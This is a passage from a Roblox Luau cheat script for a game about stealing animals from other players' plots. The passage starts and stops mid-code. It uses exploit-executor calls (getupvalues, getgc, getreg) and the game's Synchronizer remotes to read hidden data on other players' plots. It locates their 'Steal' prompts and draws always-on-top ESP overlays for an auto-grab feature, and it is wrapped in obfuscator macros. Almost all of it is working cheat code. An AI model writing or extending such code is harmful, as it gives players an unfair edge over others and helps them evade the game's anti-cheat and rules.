                        if ok and type(r) == "number" then return r end
                    end
                    return 0
                end),
            }
            -- Robust upvalue reader: tries multiple executor APIs
            local _getUpvaluesTable; _getUpvaluesTable = LPH_NO_VIRTUALIZE(function(fn)
                if type(fn) ~= "function" then return nil end
                local readers = {
                    type(getupvalues) == "function" and getupvalues or nil,
                    debug and type(debug.getupvalues) == "function" and debug.getupvalues or nil,
                }
                for _, reader in next, readers do
                    if type(reader) == "function" then
                        local ok2, vals = pcall(reader, fn)
                        if ok2 and type(vals) == "table" then return vals end
                    end
                end
                local reader = debug and debug.getupvalue
                if type(reader) ~= "function" and type(getupvalue) == "function" then
                    reader = getupvalue
                end
                if type(reader) ~= "function" then return nil end
                local vals = {}
                for idx = 1, 256 do
                    local ok2, first, second = pcall(reader, fn, idx)
                    if not ok2 or first == nil then break end
                    vals[idx] = second ~= nil and second or first
                end
                return vals
            end)
            local _isPopulatedAnimalList; _isPopulatedAnimalList = LPH_NO_VIRTUALIZE(function(value)
                if type(value) ~= "table" then return false end
                for _, entry in next, value do
                    if type(entry) == "table" and rawget(entry, "Index") ~= nil then return true end
                end
                return false
            end)
            local _normalizeChannelMap; _normalizeChannelMap = LPH_NO_VIRTUALIZE(function(value)
                if type(value) ~= "table" then return nil end
                local normalized = {}
                for chName, chData in next, value do
                    if type(chData) == "table" then
                        local cache = rawget(chData, "CacheTable")
                        if type(cache) == "table" and _isPopulatedAnimalList(rawget(cache, "AnimalList")) then
                            normalized[chName] = chData
                        elseif _isPopulatedAnimalList(rawget(chData, "AnimalList")) then
                            normalized[chName] = { CacheTable = chData }
                        end
                    end
                end
                if next(normalized) ~= nil then return normalized end
                if _isPopulatedAnimalList(rawget(value, "AnimalList")) then
                    return { DirectChannel = { CacheTable = value } }
                end
                return nil
            end)
            local _countChannels; _countChannels = LPH_NO_VIRTUALIZE(function(t)
                if type(t) ~= "table" then return 0 end
                local n = 0
                for _ in next, t do n = n + 1 end
                return n
            end)
            local _findSyncChannels; _findSyncChannels = LPH_NO_VIRTUALIZE(function(root, depthLimit)
                local visited = {}
                depthLimit = depthLimit or 14
                local best, bestCount = nil, 0
                local function scan(value, depth)
                    local vt = type(value)
                    if depth > depthLimit or (vt ~= "table" and vt ~= "function") then return end
                    if visited[value] then return end
                    visited[value] = true
                    if vt == "function" then
                        local nested = _getUpvaluesTable(value)
                        if nested then scan(nested, depth + 1) end
                        return
                    end
                    local norm = _normalizeChannelMap(value)
                    if norm then
                        local cnt = _countChannels(norm)
                        if cnt > bestCount then best, bestCount = norm, cnt end
                        return -- don't recurse deeper once we found a candidate here
                    end
                    for _, child in next, value do
                        scan(child, depth + 1)
                    end
                end
                scan(root, 0)
                return best
            end)
            local _syncChannels, _syncChannelsAt = nil, 0
            local _getSyncChannels; _getSyncChannels = LPH_NO_VIRTUALIZE(function()
                local now = tick()
                if _syncChannels and (now - _syncChannelsAt) < 1 then return _syncChannels end
                local result = nil
                pcall(LPH_NO_VIRTUALIZE(function()
                    local sync = _findModule("Packages", "Synchronizer") or _twc(RSraw, "Packages", "Synchronizer")
                    if not sync then return end
                    local mod = tryRequire(sync)
                    if type(mod) ~= "table" or type(mod.Get) ~= "function" then return end
                    local upvals = _getUpvaluesTable(mod.Get)
                    if type(upvals) == "table" then
                        result = _findSyncChannels(upvals) or _findSyncChannels(mod)
                    end
                end))
                -- Fallback: scan GC objects if upvalue path found nothing
                if not result and type(getgc) == "function" then
                    pcall(LPH_NO_VIRTUALIZE(function()
                        local ok2, loaded = pcall(getgc, true)
                        if ok2 and type(loaded) == "table" then
                            result = _findSyncChannels(loaded, 8)
                        end
                    end))
                end
                -- Fallback: Lua registry
                if not result and type(getreg) == "function" then
                    pcall(LPH_NO_VIRTUALIZE(function()
                        local ok2, reg = pcall(getreg)
                        if ok2 and type(reg) == "table" then
                            result = _findSyncChannels(reg, 8)
                        end
                    end))
                end
                if type(result) == "table" then
                    _syncChannels, _syncChannelsAt = result, now
                    local _dbgKeys = {}
                    for k in next, result do _dbgKeys[#_dbgKeys + 1] = tostring(k) end
                    _G._FH_SyncDebug = "channels=" .. #_dbgKeys .. " keys=[" .. table.concat(_dbgKeys, ",") .. "]"
                    return result
                end
                return _syncChannels
            end)
            local _syncFolder    = Packages:WaitForChild("Synchronizer", 30)
            local syncRemotes = {
                folder        = _syncFolder,
                channelFolder = _syncFolder and _syncFolder:WaitForChild("Channel", 10) or nil,
                routeRemote   = _syncFolder and _syncFolder:WaitForChild("CommunicationRoute", 10) or nil,
                requestData   = _syncFolder and _syncFolder:FindFirstChild("RequestData") or nil,
            }
            -- Live-subscribe to Synchronizer RemoteEvents (same approach as working
            -- standalone steal scripts). Builds plotAnimalSync.caches[plotName] with
            -- real AnimalList data including Mutation and Traits, without gc scanning.
            local plotAnimalSync = { caches = {}, connections = {} }
            local function _splitSyncPath(path)
                if typeof(path) == "table" then return path end
                local out = {}
                for part in string.gmatch(tostring(path), "[^%.]+") do
                    table.insert(out, tonumber(part) or part)
                end
                return out
            end
            local function _resolveSyncPath(path, root)
                local current = root
                local parent, key = nil, nil
                for _, part in ipairs(_splitSyncPath(path)) do
                    parent = current; key = part
                    current = current and current[part] or nil
                end
                return current, parent, key
            end
            local function _applyPlotSyncDiff(channelName, packet)
                local cache = plotAnimalSync.caches[channelName]
                if typeof(cache) ~= "table" then return end
                local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
                local cur, par, k = _resolveSyncPath(path, cache)
                if action == "Changed" then
                    if par ~= nil then par[k] = a end
                elseif action == "ArrayInsert" then
                    if cur ~= nil then table.insert(cur, b, a) end
                elseif action == "ArrayRemoved" then
                    if cur ~= nil then table.remove(cur, b) end
                elseif action == "DictionaryInsert" then
                    if cur ~= nil then cur[b] = a end
                elseif action == "DictionaryRemoved" then
                    if cur ~= nil then cur[b] = nil end
                end
            end
            local function _attachPlotChannel(remote)
                if plotAnimalSync.connections[remote] then return end
                local channelName = tostring(remote.Name)
                local _plots = Workspace:FindFirstChild("Plots")
                if not (_plots and _plots:FindFirstChild(channelName)) then return end
                if syncRemotes.requestData and plotAnimalSync.caches[channelName] == nil then
                    local ok, data = pcall(function()
                        return syncRemotes.requestData:InvokeServer(channelName)
                    end)
                    plotAnimalSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
                elseif plotAnimalSync.caches[channelName] == nil then
                    plotAnimalSync.caches[channelName] = {}
                end
                plotAnimalSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
                    for _, packet in ipairs(queue) do
                        _applyPlotSyncDiff(channelName, packet)
                    end
                end)
            end
            local function _detachPlotChannel(channelName)
                for remote, conn in pairs(plotAnimalSync.connections) do
                    if tostring(remote.Name) == tostring(channelName) then
                        conn:Disconnect()
                        plotAnimalSync.connections[remote] = nil
                        plotAnimalSync.caches[tostring(channelName)] = nil
                        break
                    end
                end
            end
            do
                local cf = syncRemotes.channelFolder
                if cf then
                    for _, child in ipairs(cf:GetChildren()) do
                        if child:IsA("RemoteEvent") then task.spawn(_attachPlotChannel, child) end
                    end
                    cf.ChildAdded:Connect(function(child)
                        if child:IsA("RemoteEvent") then task.spawn(_attachPlotChannel, child) end
                    end)
                end
                if syncRemotes.routeRemote then
                    syncRemotes.routeRemote.OnClientEvent:Connect(function(actions)
                        local _plots2 = Workspace:FindFirstChild("Plots")
                        for _, action in ipairs(actions) do
                            local kind, chName = action[1], tostring(action[2])
                            if not (_plots2 and _plots2:FindFirstChild(chName)) then continue end
                            if kind == "ListenerAdded" then
                                local remote = cf and cf:FindFirstChild(chName)
                                if remote and remote:IsA("RemoteEvent") then task.spawn(_attachPlotChannel, remote) end
                            elseif kind == "ListenerRemoved" then
                                _detachPlotChannel(chName)
                            end
                        end
                    end)
                end
            end
            local _getRequestData; _getRequestData = LPH_NO_VIRTUALIZE(function()
                local rd = syncRemotes.requestData
                if rd and rd.Parent then return rd end
                local folder = syncRemotes.folder
                if not (folder and folder.Parent) then
                    for _, _c in ipairs(Packages:GetChildren()) do
                        if _c:IsA("Folder") then
                            local _ch, _re
                            for _, _s in ipairs(_c:GetChildren()) do
                                if _s:IsA("Folder") then _ch = _s
                                elseif _s:IsA("RemoteEvent") then _re = _s
                                end
                            end
                            if _ch and _re then folder = _c; break end
                        end
                    end
                    syncRemotes.folder = folder
                end
                if folder then
                    for _, _s in ipairs(folder:GetChildren()) do
                        if _s:IsA("RemoteFunction") then rd = _s; break end
                    end
                end
                syncRemotes.requestData = rd
                return rd
            end)
            local getHRP; getHRP = LPH_NO_VIRTUALIZE(function()
                local c = player.Character
                return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso"))
            end)
            local getPlotOwner; getPlotOwner = LPH_NO_VIRTUALIZE(function(plot)
                local sign  = plot:FindFirstChild("PlotSign")
                local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
                local label = frame and frame:FindFirstChild("TextLabel")
                if not label or label.Text == "Empty Base" then return nil end
                return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
            end)
            local getEnemyPlots; getEnemyPlots = LPH_NO_VIRTUALIZE(function()
                local result, myName = {}, player.DisplayName
                for _, plot in ipairs(getPlotChildren()) do
                    local owner = getPlotOwner(plot)
                    if owner and owner ~= myName then table.insert(result, plot) end
                end
                return result
            end)
            local getPodiumPrompt; getPodiumPrompt = LPH_NO_VIRTUALIZE(function(podium)
                local spawn  = podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
                local att    = spawn and spawn:FindFirstChild("PromptAttachment")
                local prompt = att and att:FindFirstChildWhichIsA("ProximityPrompt")
                return (prompt and prompt.ActionText == "Steal") and prompt or nil
            end)
            local getStealPromptForSlot; getStealPromptForSlot = LPH_NO_VIRTUALIZE(function(plot, slot)
                local podiums = plot and plot:FindFirstChild("AnimalPodiums")
                local podium  = podiums and slot ~= nil and podiums:FindFirstChild(tostring(slot))
                if not podium then return nil, nil, nil end
                local base = podium:FindFirstChild("Base")
                return getPodiumPrompt(podium), base or podium, podium
            end)
            local getPodiumWorldPart; getPodiumWorldPart = LPH_NO_VIRTUALIZE(function(animal)
                if not animal then return nil end
                if animal.base and animal.base.Parent then return animal.base end
                if animal.prompt and animal.prompt.Parent then
                    local current = animal.prompt.Parent
                    if current:IsA("Attachment") then current = current.Parent end
                    if current and current.Parent then return current end
                end
                if animal.model and animal.model.Parent then return animal.model end
                return nil
            end)
            local _plotDataCache = {}
            local _plotDataAt    = {}
            local _rdVerified = nil
            local function _rdCandidates()
                local out = {}
                local primary = _getRequestData()
                if primary then out[#out + 1] = primary end
                pcall(LPH_NO_VIRTUALIZE(function()
                    for _, c in ipairs(Packages:GetChildren()) do
                        if c:IsA("Folder") then
                            for _, s in ipairs(c:GetChildren()) do
                                if s:IsA("RemoteFunction") and s ~= primary then
                                    out[#out + 1] = s
                                end
                            end
                        end
                    end
                end))
                return out
            end
            local function _rdLooksValid(data)
                return typeof(data) == "table" and typeof(data.AnimalList) == "table"
            end
            local function fetchPlotData(plotName)
                local now = tick()
                -- Fast path: live RemoteEvent cache (works without gc scanning)
                local live = plotAnimalSync.caches[plotName]
                if live and typeof(live.AnimalList) == "table" then
                    return live
                end
                if _plotDataCache[plotName] and _plotDataAt[plotName]
                   and (now - _plotDataAt[plotName] < 2) then
                    return _plotDataCache[plotName]
                end
                _plotDataAt[plotName] = now
                local channels = _getSyncChannels()
                if type(channels) == "table" then
                    local cd = channels[plotName]
                    local _matchBy = "exact"
                    if type(cd) ~= "table" then cd = channels[tostring(plotName)]; _matchBy = "tostr" end
                    if type(cd) ~= "table" then
                        local nk = tonumber(plotName)
                        if nk ~= nil then cd = channels[nk]; _matchBy = "tonum" end
                    end

                    if type(cd) ~= "table" then
                        local nk2 = tonumber(tostring(plotName):match("%d+"))
                        if nk2 ~= nil then cd = channels[nk2]; _matchBy = "numextract" end
                    end

                    if type(cd) ~= "table" then
                        local _plots = Workspace:FindFirstChild("Plots")
                        local _pObj  = _plots and _plots:FindFirstChild(plotName)
                        local _pOwner = _pObj and getPlotOwner(_pObj)
                        if _pOwner then
                            for _chKey, _cdc in next, channels do
                                if type(_cdc) == "table" and type(_cdc.CacheTable) == "table"
                                   and _cdc.CacheTable.Owner == _pOwner then
                                    cd = _cdc; _matchBy = "owner"; break
                                end
                            end
                            -- If owner lookup missed, try Owner as UserId
                            if type(cd) ~= "table" then
                                for _chKey, _cdc in next, channels do
                                    if type(_cdc) == "table" and type(_cdc.CacheTable) == "table" then
                                        local _co = _cdc.CacheTable.Owner
                                        if _co then
                                            local _coStr = tostring(_co)
                                            if _coStr == _pOwner
                                                or _coStr:lower() == _pOwner:lower() then
                                                cd = _cdc; _matchBy = "owner-ci"; break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end

                    -- Last resort: if only one channel exists, use it
                    if type(cd) ~= "table" then
                        local _onlyKey, _onlyVal, _cnt = nil, nil, 0
                        for k, v in next, channels do _cnt = _cnt + 1; _onlyKey = k; _onlyVal = v end
                        if _cnt == 1 then cd = _onlyVal; _matchBy = "only" end
                    end

                    if type(cd) == "table" and type(cd.CacheTable) == "table"
                       and type(cd.CacheTable.AnimalList) == "table" then
                        _plotDataCache[plotName] = cd.CacheTable
                        _G._FH_PlotMatch = _matchBy .. " plot=" .. tostring(plotName)
                        return cd.CacheTable
                    end

                    -- Debug: log why matching failed
                    if not _G._FH_PlotMatchFail then
                        local _dbg = "plot=" .. tostring(plotName) .. " cd=" .. tostring(cd)
                        if type(cd) == "table" then
                            _dbg = _dbg .. " CT=" .. tostring(rawget(cd, "CacheTable"))
                            local ct = rawget(cd, "CacheTable")
                            if type(ct) == "table" then
                                _dbg = _dbg .. " AL=" .. tostring(rawget(ct, "AnimalList"))
                                .. " Owner=" .. tostring(rawget(ct, "Owner"))
                            end
                        end
                        _G._FH_PlotMatchFail = _dbg
                    end
                end
                if _rdVerified and _rdVerified.Parent then
                    local okd, data = pcall(LPH_NO_VIRTUALIZE(function()
                        return _rdVerified:InvokeServer(plotName)
                    end))
                    if okd and typeof(data) == "table" then
                        _plotDataCache[plotName] = data
                        return data
                    end
                    _rdVerified = nil
                end
                for _, rf in ipairs(_rdCandidates()) do
                    local okd, data = pcall(LPH_NO_VIRTUALIZE(function()
                        return rf:InvokeServer(plotName)
                    end))
                    if okd and _rdLooksValid(data) then
                        _rdVerified = rf
                        _G._FH_DataStatus = (_G._FH_DataStatus or "") .. " remote=" .. rf:GetFullName()
                        _plotDataCache[plotName] = data
                        return data
                    end
                end
                return _plotDataCache[plotName]
            end
            _G._FH_PlotData = fetchPlotData
            _G._FH_FetchPlotData = fetchPlotData
            _G._FH_AnimalsShared = AnimalsShared
            -- Hardened world reader: finds the $/s generation (and rarity) text that
            -- is still shown above pets, even if the synchronizer path is patched.
            -- Searches the given roots + any nearby overhead within `radius` of pos.
            _G._FH_ParseGen = LPH_NO_VIRTUALIZE(function(t)
                if type(t) ~= "string" then return 0 end
                -- must look like a rate to avoid grabbing rarity / rebirth numbers
                if not (t:find("/s") or t:find("%$")) then return 0 end
                local numTxt, suf = t:match("([%d%.,]+)%s*([KkMmBbTtQq]?)")
                if not numTxt then return 0 end
                local n = tonumber((numTxt or ""):gsub(",", "")) or 0
                local s = (suf or ""):upper()
                if     s == "K" then n = n * 1e3
                elseif s == "M" then n = n * 1e6
                elseif s == "B" then n = n * 1e9
                elseif s == "T" then n = n * 1e12
                elseif s == "Q" then n = n * 1e15 end
                return n
            end)
            _G._FH_ReadGenWorld = LPH_NO_VIRTUALIZE(function(pos, roots)
                local parse = _G._FH_ParseGen
                local bestGen, rarity = 0, nil
                local scanRoot; scanRoot = function(root)
                    if not root then return end
                    for _, d in ipairs(_FH_GetDesc(root)) do
                        if d:IsA("TextLabel") or d:IsA("TextBox") then
                            local t = d.Text
                            if t and t ~= "" then
                                if t:find("/s") then
                                    local g = parse(t)
                                    if g > bestGen then bestGen = g end
                                elseif (not rarity) and (d.Name == "Rarity" or d.Name == "RarityLabel") then
                                    rarity = t
                                end
                            end
                        end
                    end
                end
                if type(roots) == "table" then
                    for _, r in ipairs(roots) do scanRoot(r) end
                end
                -- if still nothing, sweep nearby overhead models by world position
                if bestGen <= 0 and typeof(pos) == "Vector3" then
                    local containers = { Workspace:FindFirstChild("Debris"), Workspace:FindFirstChild("RenderedMovers") }
                    for _, cont in ipairs(containers) do
                        if cont then
                            for _, ch in ipairs(cont:GetChildren()) do
                                if ch:IsA("Model") then
                                    local pp = ch.PrimaryPart or ch:FindFirstChildWhichIsA("BasePart")
                                    if pp and (pp.Position - pos).Magnitude < 16 then
                                        scanRoot(ch)
                                        if bestGen > 0 then break end
                                    end
                                end
                            end
                        end
                        if bestGen > 0 then break end
                    end
                end
                return bestGen, rarity
            end)
            _G._FH_SlotInfo = LPH_NO_VIRTUALIZE(function(index, mutation, traits)
                local info = AnimalsData[index]
                local displayName = (info and info.DisplayName) or tostring(index)
                local gv = 0
                pcall(LPH_NO_VIRTUALIZE(function() gv = AnimalsShared:GetGeneration(index, mutation, traits, nil) end))
                return displayName, gv
            end)
            local _fhFmtGen; _fhFmtGen = LPH_NO_VIRTUALIZE(function(n)
                n = tonumber(n) or 0
                if n <= 0 then return "" end
                local sfx, si = {"", "K", "M", "B", "T", "Qa", "Qi"}, 1
                while n >= 1000 and si < #sfx do n = n / 1000; si = si + 1 end
                return string.format(si == 1 and "$%d%s/s" or "$%.1f%s/s", n, sfx[si])
            end)
            _G._FH_FmtGen = _fhFmtGen
            -- Robustly resolve an AnimalList entry for a podium: try the slot key as
            -- raw string, number and numeric string, then fall back to matching the
            -- animal name against entry.Index (or its DisplayName from Datas.Animals).
            local _fhResolveEntry; _fhResolveEntry = LPH_NO_VIRTUALIZE(function(al, podiumName, animalName)
                if typeof(al) ~= "table" then return nil end
                local podName = tostring(podiumName or "")
                local cand = al[podName]
                if typeof(cand) == "table" and cand.Index ~= nil then return cand end
                local podNum = tonumber(podName) or tonumber(podName:match("%d+"))
                if podNum ~= nil then
                    cand = al[podNum]
                    if typeof(cand) == "table" and cand.Index ~= nil then return cand end
                    cand = al[tostring(podNum)]
                    if typeof(cand) == "table" and cand.Index ~= nil then return cand end
                end
                local want = tostring(animalName or ""):lower()
                if want == "" then return nil end
                for _, e in next, al do
                    if typeof(e) == "table" and e.Index ~= nil then
                        if tostring(e.Index):lower() == want then return e end
                        local info = _FH_realAnimalsData and _FH_realAnimalsData[e.Index]
                        local disp = info and info.DisplayName
                        if disp and tostring(disp):lower() == want then return e end
                    end
                end
                return nil
            end)
            _G._FH_ResolveEntry = _fhResolveEntry
            local function scanAllPlots()
                local result = {}
                local _scanYield = 0
                for _, plot in ipairs(getPlotChildren()) do
                    pcall(LPH_NO_VIRTUALIZE(function()
                        local pods = plot:FindFirstChild("AnimalPodiums")
                        if not pods then return end
                        for _, podium in ipairs(pods:GetChildren()) do
                            _scanYield = _scanYield + 1
                            if _scanYield % 8 == 0 then task.wait() end
                            if podium:IsA("Model") or podium:IsA("Folder") then
                                pcall(LPH_NO_VIRTUALIZE(function()
                                    local base = podium:FindFirstChild("Base")
                                    local spawnPart = base and base:FindFirstChild("Spawn")
                                    if not spawnPart then return end
                                    local prompt
                                    for _, obj in ipairs(_FH_GetDesc(spawnPart)) do
                                        if obj:IsA("ProximityPrompt") and obj.ObjectText and obj.ObjectText ~= "" then
                                            prompt = obj
                                            break
                                        end
                                    end
                                    if not prompt then
                                        local direct = spawnPart:FindFirstChildOfClass("ProximityPrompt")
                                        if direct and direct.ObjectText and direct.ObjectText ~= "" then prompt = direct end
                                    end
                                    if not prompt then return end
                                    local displayName = prompt.ObjectText
                                    local pos
                                    local holder = prompt.Parent
                                    if holder and holder:IsA("Attachment") then
                                        pos = holder.WorldPosition
                                    elseif holder and holder:IsA("BasePart") then
                                        pos = holder.Position
                                    elseif spawnPart:IsA("BasePart") then
                                        pos = spawnPart.Position
                                    else
                                        local part = spawnPart:FindFirstChildWhichIsA("BasePart", true)
                                            or (base and base:FindFirstChildWhichIsA("BasePart", true))
                                        pos = part and part.Position or nil
                                    end
                                    if not pos then return end
                                    local model
                                    do
                                        local lower = string.lower(displayName)
                                        for _, ch in ipairs(plot:GetChildren()) do
                                            if ch:IsA("Model") and (ch.Name == displayName or string.lower(ch.Name) == lower) then
                                                model = ch; break
                                            end
                                        end
                                        if not model then
                                            for _, ch in ipairs(plot:GetChildren()) do
                                                if ch:IsA("Model") and ch:FindFirstChild("AnimalOverhead", true) then
                                                    local pp = ch.PrimaryPart or ch:FindFirstChildWhichIsA("BasePart")
                                                    if pp and (pp.Position - pos).Magnitude < 12 then
                                                        model = ch
                                                        break
                                                    end
                                                end
                                            end
                                        end
                                    end
                                    local genValue, genStr, rarity = 0, nil, nil
                                    pcall(LPH_NO_VIRTUALIZE(function()
                                        local parseGen; parseGen = function(t)
                                            local numTxt, suf = t:match("%$([%d%.,]+)%s*([KkMmBbTt]?)")
                                            local n = tonumber((numTxt or ""):gsub(",", "")) or 0
                                            local s = (suf or ""):upper()
                                            if s == "K" then n = n * 1e3
                                            elseif s == "M" then n = n * 1e6
                                            elseif s == "B" then n = n * 1e9
                                            elseif s == "T" then n = n * 1e12 end
                                            return n
                                        end
                                        local overhead = podium:FindFirstChild("AnimalOverhead", true)
                                            or spawnPart:FindFirstChild("AnimalOverhead", true)
                                            or (model and model:FindFirstChild("AnimalOverhead", true))
                                        if overhead then
                                            local g = overhead:FindFirstChild("Generation", true)
                                            local r = overhead:FindFirstChild("Rarity", true)
                                            if g and g.Text and g.Text ~= "" then genStr = g.Text; genValue = parseGen(g.Text) end
                                            if r and r.Text and r.Text ~= "" then rarity = r.Text end
                                        end
                                        if not genStr or not rarity then
                                            local roots = { podium, model }
                                            for _, root in ipairs(roots) do
                                                if root then
                                                    for _, d in ipairs(_FH_GetDesc(root)) do
                                                        if (d:IsA("TextLabel") or d:IsA("TextBox")) and d.Text and d.Text ~= "" then
                                                            local t = d.Text
                                                            if not genStr and t:match("%$") and t:match("/s") then
                                                                genStr = t; genValue = parseGen(t)
                                                            elseif not rarity and (d.Name == "Rarity" or d.Name == "RarityLabel") then
                                                                rarity = t
                                                            end
                                                        end
                                                    end
                                                end
                                                if genStr and rarity then break end
                                            end
                                        end
                                        if (not rarity) or (not genStr) then
                                            local deb = Workspace:FindFirstChild("Debris")
                                            if deb then
                                                local bestModel, bestDist = nil, 14
                                                for _, ch in ipairs(deb:GetChildren()) do
                                                    if ch:IsA("Model") then
                                                        local pp = ch.PrimaryPart or ch:FindFirstChildWhichIsA("BasePart")
                                                        if pp then
                                                            local d = (pp.Position - pos).Magnitude
                                                            if d < bestDist and ch:FindFirstChild("AnimalOverhead", true) then
                                                                bestModel, bestDist = ch, d
                                                            end
                                                        end
                                                    end
                                                end
                                                if bestModel then
                                                    local ov = bestModel:FindFirstChild("AnimalOverhead", true)
                                                    local r = ov and ov:FindFirstChild("Rarity", true)
                                                    local g = ov and ov:FindFirstChild("Generation", true)
                                                    if (not rarity) and r and r.Text and r.Text ~= "" then rarity = r.Text end
                                                    if (not genStr) and g and g.Text and g.Text ~= "" then genStr = g.Text; genValue = parseGen(g.Text) end
                                                    if not model then model = bestModel end
                                                end
                                            end
                                        end
                                    end))
                                    local mutation, traits = nil, nil
                                    pcall(LPH_NO_VIRTUALIZE(function()
                                        local cache = fetchPlotData(plot.Name)
                                        local al = cache and cache.AnimalList
                                        if typeof(al) ~= "table" then return end
                                        local d = _fhResolveEntry(al, podium.Name, displayName)
                                        if typeof(d) == "table" then
                                            if d.Mutation and d.Mutation ~= "" then mutation = d.Mutation end
                                            traits = d.Traits
                                            if ((not genStr) or genValue <= 0) and d.Index then
                                                local gv = AnimalsShared:GetGeneration(d.Index, d.Mutation, d.Traits, nil) or 0
                                                if gv > 0 then genValue = gv end
                                            end
                                        end
                                    end))
                                    if (genValue <= 0) and _G._FH_ReadGenWorld then
                                        pcall(LPH_NO_VIRTUALIZE(function()
                                            local g, r = _G._FH_ReadGenWorld(pos, { podium, model, plot })
                                            if (g or 0) > 0 then genValue = g end
                                            if (not rarity) and r then rarity = r end
                                        end))
                                    end
                                    genStr = _fhFmtGen(genValue)
                                    table.insert(result, {
                                        displayName = displayName,
                                        gen = genStr,
                                        mutation = mutation,
                                        traits = traits,
                                        rarity = rarity,
                                        line2 = (rarity and rarity ~= "") and rarity or "",
                                        num = genValue,
                                        position = pos,
                                        prompt = prompt, model = model or podium, base = base,
                                        plotName = plot.Name,
                                        slot = tonumber(tostring(podium.Name):match("%d+")) or podium.Name,
                                    })
                                end))
                            end
                        end
                    end))
                end
                table.sort(result, LPH_NO_VIRTUALIZE(function(a, b) return a.num > b.num end))
                return result
            end
            local cachedBrainrots = {}
            local _scanRunning = false
            task.spawn(function()
                while task.wait(0.25) do
                    if _isShuttingDown() then break end
                    if _GEN ~= _G._FH_GAMMA_GEN then break end
                    local active = M.enabled or M.lineEnabled or (_G._FH_SelectedSig ~= nil)
                        or (_G._FH_GammaNeedList == true)
                    _G._FH_ESPNeedList = active and true or false
                    if active and not _scanRunning then
                        _scanRunning = true
                        task.spawn(function()
                            pcall(LPH_NO_VIRTUALIZE(function()
                                local fresh = scanAllPlots()
                                local ag = _G._FH_AutoGrab
                                if ag and ag.animalList then
                                    local seen = {}
                                    for _, a in ipairs(fresh) do
                                        local sig = tostring(a.plotName or "") .. "::" .. tostring(a.slot or 0)
                                        seen[sig] = true
                                    end
                                    for _, br in ipairs(ag.animalList) do
                                        local sig = tostring(br.plotName or "") .. "::" .. tostring(br.pod or 0)
                                        if not seen[sig] then
                                            local agPrompt, agBase = nil, nil
                                            pcall(LPH_NO_VIRTUALIZE(function()
                                                local p = Workspace:FindFirstChild("Plots")
                                                local plot = p and p:FindFirstChild(br.plotName or "")
                                                local pods = plot and plot:FindFirstChild("AnimalPodiums")
                                                local pod  = pods and pods:FindFirstChild(tostring(br.pod or ""))
                                                local base = pod and pod:FindFirstChild("Base")
                                                local spawn = base and base:FindFirstChild("Spawn")
                                                local att  = spawn and spawn:FindFirstChild("PromptAttachment")
                                                agPrompt = att and att:FindFirstChildWhichIsA("ProximityPrompt")
                                                agBase   = base or pod
                                            end))
                                            if agPrompt then
                                                table.insert(fresh, {
                                                    displayName = br.name or br.modelName or "?",
                                                    gen = "", rarity = "", line2 = "",
                                                    num = br.genValue or 0,
                                                    mutation = br.mutation,
                                                    traits = br.traits,
                                                    position = agBase and agBase.Position or Vector3.zero,
                                                    prompt = agPrompt, model = agBase, base = agBase,
                                                    plotName = br.plotName or "",
                                                    slot = br.pod or 0,
                                                })
                                            end
                                        end
                                    end
                                end
                                cachedBrainrots = fresh
                                -- publish a lookup so other panels (priority) can read gen/mut/traits
                                local lut = {}
                                for _, a in ipairs(fresh) do
                                    local key = tostring(a.plotName or "") .. "::" .. tostring(a.slot or 0)
                                    lut[key] = {
                                        gen      = a.num or 0,
                                        mutation = a.mutation,
                                        traits   = a.traits,
                                        rarity   = a.rarity,
                                        name     = a.displayName,
                                    }
                                end
                                _G._FH_GenLookup = lut
                            end))
                            _scanRunning = false
                        end)
                    end
                end
            end)
            local holder = _G._FH_ESP_GUI or GUI.Parent or GUI
            local pool = {}
            local mkLine; mkLine = LPH_NO_VIRTUALIZE(function(parent, y, h, size, color)
                local l = Instance.new("TextLabel")
                l.Size                   = UDim2.new(1, 0, 0, h)
                l.Position               = UDim2.new(0, 0, 0, y)
                l.BackgroundTransparency = 1
                l.Font                   = Enum.Font.FredokaOne
                l.TextSize               = size
                l.Text                   = ""
                l.TextColor3             = color
                l.TextStrokeTransparency = 0
                l.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
                l.Parent                 = parent
                return l
            end)
            local getEntry; getEntry = LPH_NO_VIRTUALIZE(function(i)
                local e = pool[i]
                if e then return e end
                local bb = Instance.new("BillboardGui")
                bb.Name           = "BR_ESP"
                bb.Size           = UDim2.new(0, 190, 0, 56)
                bb.StudsOffset    = Vector3.new(0, 2.6, 0)
                bb.AlwaysOnTop    = true
                bb.LightInfluence = 0
                bb.MaxDistance    = math.huge
                bb.ClipsDescendants = false
                bb.Enabled        = false
                bb.Parent         = holder
                local mutLbl  = mkLine(bb, 0,  14, 12, Color3.fromRGB(255, 200, 80))
                local nameLbl = mkLine(bb, 14, 14, 13, Color3.fromRGB(255, 255, 255))
                local genLbl  = mkLine(bb, 28, 14, 11, Color3.fromRGB(130, 255, 140))
                e = { bb = bb, mutLbl = mutLbl, nameLbl = nameLbl, genLbl = genLbl }
                pool[i] = e
                return e
            end)
            local _podiumHighlight = Instance.new("Highlight")
            _podiumHighlight.FillColor           = Color3.fromRGB(255, 50, 50)
            _podiumHighlight.OutlineColor        = Color3.fromRGB(255, 255, 255)
            _podiumHighlight.FillTransparency    = 0.4
            _podiumHighlight.OutlineTransparency = 0
            _podiumHighlight.DepthMode           = Enum.HighlightDepthMode.AlwaysOnTop
            _podiumHighlight.Enabled             = false
            _podiumHighlight.Parent              = Workspace
            local _brAcc = 0
            local _brConn
            _brConn = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(dt)
                if _isShuttingDown() or _GEN ~= _G._FH_GAMMA_GEN then
                    if _brConn then _brConn:Disconnect() end
                    return
                end
                _brAcc = _brAcc + dt
                if _brAcc < (isMobile and 0.15 or 0.08) then return end
                _brAcc = 0
                local _selSigEarly = _G._FH_SelectedSig
                if not M.enabled and not M.lineEnabled and not _selSigEarly then
                    for _, e in ipairs(pool) do if e.bb.Enabled then e.bb.Enabled = false end end
                    _podiumHighlight.Enabled = false
                    return
                end
                local used = 0
                local _animT = (math.sin(os.clock() * 2.5) + 1) * 0.5
                local COLOR_OG       = Color3.fromRGB(15, 15, 15)
